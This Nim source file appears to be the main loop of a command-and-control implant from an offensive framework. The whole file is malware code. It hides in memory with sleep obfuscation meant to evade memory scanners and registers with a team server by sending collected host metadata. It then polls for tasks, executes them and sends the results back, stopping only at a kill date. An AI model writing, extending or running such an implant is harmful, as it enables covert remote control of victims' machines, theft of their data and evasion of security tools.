import times, system, random, strformat
import core/[context, sleepmask, exit, transport]
import utils/io
import protocol/[task, result, registration]
import ../common/[types, utils, crypto]

proc main() = 
    randomize()

    # Initialize agent context
    var ctx = AgentCtx.init()
    if ctx == nil: 
        quit(0)

    #[
        Agent routine: 
        1. Sleep obfuscation
        2. Check kill date
        3. Register to the team server if not already connected
        4. Retrieve tasks via checkin request to a GET endpoint
        5. Execute task and post result
        6. If additional tasks have been fetched, go to 6.
        7. If no more tasks need to be executed, go to 1. 
    ]#
    while true: 
        try: 
            # Sleep obfuscation to evade memory scanners
            sleepObfuscate(ctx.sleepSettings)

            # Check kill date and exit the agent process if it is reached
            if ctx.killDate != 0 and now().toTime().toUnix().int64 >= ctx.killDate: 
                print "[*] Reached kill date: ", ctx.killDate.fromUnix().utc().format("dd-MM-yyyy HH:mm:ss"), " (UTC)."
                print "[*] Exiting."
                exit()
            
            # Register
            if not ctx.registered: 
                # Create registration payload   
                var registration: Registration = ctx.collectAgentMetadata()
                let registrationBytes = ctx.serializeRegistrationData(registration)

                if ctx.sendData(registrationBytes): 
                    print fmt"[+] [{ctx.agentId}] Agent registered."
                    ctx.registered = true
                else: 
                    print "[-] Agent registration failed."
                    continue

            let date: string = now().format(protect("dd-MM-yyyy HH:mm:ss"))
            print "\n", fmt"[*] [{date}] Checking in."

            # Retrieve task queue for the current agent by sending a check-in/heartbeat request
            # The check-in request contains the agentId and listenerId, so the server knows which tasks to return
            let packet: string = ctx.getTasks()
            if packet.len <= 0: 
                print "[*] No tasks to execute."
                continue

            let tasks: seq[Task] = ctx.deserializePacket(packet)
            if tasks.len <= 0: 
                print "[*] No tasks to execute."
                continue

            # Execute all retrieved tasks and return their output to the server
            for task in tasks: 

                # Forward tasks to linked agents if necessary
                if Uuid.toString(task.header.agentId) != ctx.agentId: 
                    discard 
                    
                else: 
                    var result: TaskResult = ctx.handleTask(task)
                    let resultBytes: seq[byte] = ctx.serializeTaskResult(result)
                    ctx.sendData(resultBytes)

            # Check if there are results of linked agents that need to be returned 
            # for link in ctx.links: 
            #     discard

        except CatchableError as err: 
            print "[-] ", err.msg

when isMainModule:
    main() 